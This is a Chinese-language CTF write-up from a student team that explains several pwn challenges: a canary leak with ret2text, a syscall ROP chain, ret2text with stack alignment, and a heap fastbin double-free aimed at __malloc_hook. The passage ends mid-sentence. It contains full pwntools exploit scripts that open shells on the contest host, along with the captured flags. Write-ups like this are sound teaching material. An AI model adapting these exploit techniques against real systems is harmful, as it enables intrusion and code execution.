---
title: 首届云枢杯CTF&amp;HW挑战赛wp
url: https://mp.weixin.qq.com/s/SeGyKgaWzwCy1mDhRgpB5Q
source: Doonsec's feed
date: 2026-04-19
fetch_date: 2026-04-20T04:54:47.796134
---

# 首届云枢杯CTF&amp;HW挑战赛wp

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dribnicsKeGgcUBjxyuEnBEYBVk7d7icysKjia58DLvDkyP5knhq8icSHNADkFwCmmeEADqsvBicFibZgKQxzhtMzE5EetFg5QBnsbticvLoRHZAjHY/0?wx_fmt=jpeg)

# 首届云枢杯CTF&HW挑战赛wp

三社院信息Sec
三社院信息Sec

三社院信息Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 前言

队伍名字--小月

高校赛道-排名:4  解出23道题目 一共25道

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dribnicsKeGgdm7BGOCq41nCiaBa5YqKDQz97QYibwzibqCPdv54xvtJJL3u2KNFjYkf6C4rBosaLLqlsgepiboIXaoEd5Xm1rC0oDqOcXnibufBYQ/640?wx_fmt=png&from=appmsg)

# Pwn

## Canary！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dribnicsKeGgduKVicibX5mv3M40xY0j0SLtphkVrwkL4IW6M5UkibcYFYlb7z6yYkJbnxKibjuib11r786fA6UiakEIIpPVPnR2Qdjrj6tyRcTOeqg/640?wx_fmt=png&from=appmsg)

栈溢出  Canary 泄漏  Ret2Text

main函数

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgfw8yia1pRfMP2fzqoSdDXuBHXNcxlM7s2FkNs57M113Eib5aExCVK2dPBbg9D8c0Y3crxzTSbx2mtmyunmibZngfw00gcdXuD4Q8/640?wx_fmt=png&from=appmsg)

```
read(0, buf, 0x400u)：buf 只有 104 字节 ([rbp-0x80])，却能读 0x400，栈溢出。
puts(buf)：前面有个随机数校验 if (v6 == atoi(buf))，随便输点字母必然走进 else 分支触发 puts。由于 read 不会给字符串末尾补 \x00，正好可以利用这个 puts 把相邻内存的数据“顺”出来。
```

利用思路

```
泄露 Canary
Canary 在 [rbp-0x18]，和 buf 差了 104 个字节。
构造 104字节垃圾数据 + 1字节覆盖。这 1 字节刚好覆盖掉 Canary 最低位的 \x00。这样 puts 打印的时候停不下来，会顺带把 Canary 剩下的 7 个字节全打出来。接收后补上 \x00 还原。

劫持返回地址 (Ret2Text)
拿到 Canary 后，程序紧接着又给了一次 read。
顺着栈往下覆盖：104字节垃圾数据 -> 刚刚泄露的Canary -> 24字节垃圾数据 (填满到返回地址的空隙+覆盖旧RBP) -> ret指令(栈对齐) -> system("sh")的地址。
```

exp.py

```
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

host = 'player.wdsec.com.cn'
port = 32465

def exploit():
    p = remote(host, port)

    p.send(b"A" * 104 + b"B")
    p.recvuntil(b"A" * 104 + b"B")

    canary = u64(b"\x00" + p.recv(7))
    p.recvline()

    payload = b"A" * 104
    payload += p64(canary)
    payload += b"B" * 24
    payload += p64(0x401356)
    payload += p64(0x4012F3)

    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dribnicsKeGgf08g2mRYX7LibWPib45rpmKicQdkZjvg5zDQ1r9b2vBWxicOqqsiayRVuHUmtaC7VwXaDOjkjXCzzNiaBfTS3BGLuNL041LcmKb3K7M/640?wx_fmt=png&from=appmsg)

```
flag{e83b4059-abef-407a-9dfa-e6f481c602f8-785-55}
```

## syscall?

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dribnicsKeGgewunlZs5iaa93JO2CYBk4iadHRvDPht4SoicyGKc6A0c9g2raJuq7RemICNwJdO6hg1EByJmCdkxnr7UYNaiccV7VicWibScKibH9k7k/640?wx_fmt=png&from=appmsg)

main函数

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgdD1Jdk2HZDjMIm2j84PO5zaZGsNayZ47QA9q3rlIv7WSu993KatLrFOEyI1ic3ibR4Go1GqTeXbrJicYibwXGsh6atWDicw1rxorF4/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/dribnicsKeGgcbFiaibCF7wUm1dLibaq0uYHqCHZxSCMRpyetczFTzic5SkoOrB3hRTz06AIChC6v7ksyX6nVqstRjJDLcuoJJeIicGzQZ9FJ1tuN0/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgeXmKzTnPBLibsXEJD3akzNQialPmicy28BaO5zWGfpgJSLeq1iau4vacUolt5DCCrroJibAOz0CGxoo3eribibM4WNyzr3npXZAWic8OE/640?wx_fmt=png&from=appmsg)

```
程序在栈上分配了大小为 0x40 的缓冲区 buf，但在调用 read(0, buf, 0x100u) 时允许读入 0x100 字节的数据，导致栈溢出。覆盖到函数返回地址的偏移量为 0x40 + 8 = 72 字节。
```

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgd1SlFsnCUk098SxSdwm4eIHaCnZpOvic9Q3vJ3fsASGAolDl2UfbBlAaKWhiaLnicicT1BtgefmkFySGV4eSFUibBMRgqYib7icLM6g0/640?wx_fmt=png&from=appmsg)

```
程序中预留了构建完整系统调用链的 gadget 函数（地址：0x401176）以及全局变量区的 /bin/sh 字符串。直接通过栈溢出劫持控制流，利用这些 ROP chain 执行 execve("/bin/sh", 0, 0)。
```

地址构造信息

```
/bin/sh 字符串地址：0x404040
pop rax; ret 地址：0x40117E
pop rdi; ret 地址：0x401180
pop rsi; pop rdx; ret 地址：0x401182
syscall 地址：0x401185
系统调用号 execve 为 59。
```

exp.py

```
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = remote('player.wdsec.com.cn', 31465)

pop_rax_ret = 0x40117E
pop_rdi_ret = 0x401180
pop_rsi_rdx_ret = 0x401182
syscall_ret = 0x401185
bin_sh_addr = 0x404040

payload = b'A' * 72
payload += p64(pop_rax_ret)
payload += p64(59)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(pop_rsi_rdx_ret)
payload += p64(0)
payload += p64(0)
payload += p64(syscall_ret)

io.recvuntil(b"Do u know syscall?\n")
io.send(payload)

io.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgclhd4mMW61KGMz2vZjvlibwYBkKHUiaKgT6ZM0pVgZlyvDibdwT4I9P4OJibcg9rTZnGr3hGQV6T9IBice1ZhXNUwNc8hDO07pviaG8/640?wx_fmt=png&from=appmsg)

```
flag{f8ef38d4-91e5-424f-a7a0-26e9a9f739a4-785-56}
```

## ret2text\_pro

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgewULI8POo6pXvADs9ZVRCiaVd5mK4GTJAibHPOuakOf8TCAugiaWCe1XS3cL2sdYkqpkmp7iaak0slD2FFhJn8OMWRmQjotMCkdWw/640?wx_fmt=png&from=appmsg)

后门函数

sub\_4011B7

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgcfFAhHI5AIvq2FL1EZLq8D8x5V2EzMvx5unJkDnxywb1ic9MvFHm75ure2iaMvJlcvm2PcYBbSkZWjukUzOickmJAKicjXTBDQj04/640?wx_fmt=png&from=appmsg)

```
IDA 中能看到这个函数里拼了 /bin/sh 然后直接调用了 _system
利用地址 (0x4011B8)：脚本的 payload 没用函数首地址 0x4011B7 ，而是故意往后偏了 1 字节打到了 0x4011B8 。这是为了跳过开头的 push rbp 指令 ，经典操作，用来拉平栈帧，绕过 64 位 glibc 里 system 函数的 movaps 16字节栈对齐检查（不然直接报段错误）。
```

main函数

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgelbPibyHjBDIhUn2CuNkhP9rV7M0FBqHsTaS1FWicxibOqLVFIlicZe7HEdFby5KDaGCPtYwWia1RMa5Mq30zWpmh4mzC6BBCCpOjQ/640?wx_fmt=png&from=appmsg)

```
溢出点 (main)：漏洞在 main 函数最后的 read(0, buf, 0x30u) 。因为变量 buf 离 rbp 的距离是 0x20（32字节），再加上用来覆盖 saved rbp 的 8 字节，填入 40 个字节的垃圾数据
```

exp.py

```
from pwn import *

context(os='linux', arch='amd64')
io = remote('player.wdsec.com.cn', 32184)

payload = b'a' * 40 + p64(0x4011B8)

io.sendafter(b'please input:\n', payload)
io.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgeaBqF4JYhUQCENBCrSsN84EcFDqTHqYEPendTy4h3Q5CS1dvYd8Lts6KicRibebCEKZoGuPuwASicNKs2wGcObFps96mwdaGghAs/640?wx_fmt=png&from=appmsg)

```
flag{7k3-m2a-9x4b5c6d8e}
```

## heap

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dribnicsKeGgcJJTyEUuKYVxhVlxgqZh2IzHGxvEkSQfqBnbDzBNicFR7ic2kAfxWcq5dWhE6pgPlq77KelZ1qorXL0q348hTKibpXibXtMrhiaLxE/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgfGxCYDgIsFiaiaVomkSWdicMwBFJqz3LNGU2XvtSZT96XKfSpJux3wZ9LEqt0AwZVwpvYv30ZEOd0z3LeicscKHvAzr4SLpUb3agY/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgfLbib04RXFhZN0AVJgSw0Dha9P51ZrUI9eUwqUI4nmSd3I2ictTZdibX2ak5DQo03uKf38SUKb4zU2mcmj4uIicsVNa6TkHyuwPLQ/640?wx_fmt=png&from=appmsg)

全开，GOT不可写，栈有canary，只能走堆利用。

create

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dribnicsKeGgfRwX3TbuHfZ1zNduhgnBmkiayGQuEpDQWDaKl4MbCsmlbph4v66rwT38BLKMicydSGtaMhSicQNtiadXLtIjxYcNaHziaKgq2Sf6og/640?wx_fmt=png&from=appmsg)

分配任意大小的chunk，存到全局数组。

get

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgeibtGlwvtxiby5ibryuwyTPcHNSkWHNxnjEFJxoJoHiat73sMZ2ZlhYicqhn0EKRicibbfiapsvfrHfSDCdibHEAzGjy1W0js6poPibV5icU/640?wx_fmt=png&from=appmsg)

```
用%s打印chunk内容，遇到\x00截断。这里可以泄露libc地址。
```

set

![](https://mmbiz.qpic.cn/mmbiz_png/dribnicsKeGgfaKgTFqKwJt2H7nYPTJmLjdRaTjuLzdBbvRM1F8hRNpyryc2fc7FqRCesvgpCwjzLAhP44Z4sxZeQohOH430qQEV2ia6psTFSc/640?wx_fmt=png&from=appmsg)

```
往chunk写数据，写入长度是创建时的size。
```

delete

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dribnicsKeGgfZUXGGoBXqictSYibOO6ByVNBEJFkSsXUhia0o23GxQtdY2fP0Zkia3tiaMIU1zMmgd2FeSDcYu5nzXvlgs9IfVGeF20kOJck1QBjA/640?wx_fmt=png&from=appmsg)

```
free后只清零`g_used[i]，但g_ptrs[i]指针没清空，存在UAF。而且没有检查double free，可以对同一个chunk多次free。
```

泄露libc

```
利用unsorted bin的fd/bk指针泄露main_arena地址：
create(0x420) 分配大chunk（idx 0）
create(0x18)分配小chunk防止合并top chunk（idx 1）
delete(0) 释放大chunk进unsorted bin
create(0x420) 再次分配同样大小（idx 2）
此时idx 2的chunk从unsorted bin取回，用户数据区前16字节残留着原来的fd/bk指针（指向main_arena+88）。
用get(2)读取，拿到libc地址：
```

发现libc\_base & 0xfff == 0，确认是glibc 2.23。

fastbin double free

glibc 2.23没有tcache，fastbin检查很弱，可以直接double free：

```
create(0x60)  # idx 3
create(0x60)  # idx 4
delete(3)
delete(4)
delete(3)     # double free
```

此时fastbin链表：chunk3 -> chunk4 -> chunk3，形成循环。

劫持\_\_malloc\_hook

```
利用fastbin dup把chunk分配到__malloc_hook附近：
create(0x60)分配idx 5，拿到chunk3
set_note(5, p64(malloc_hook - 0x23))` 修改chunk3的fd指向fake chunk
create(0x60)分配idx 6，拿到chunk4
create(0x60)分配idx 7，拿到chunk3（循环回来）
create(0x60) 分配idx 8，拿到fake chunk

fake chunk地址是malloc_hook - 0x23，这个位置前面有个0x7f字节可以伪造size字段（对应...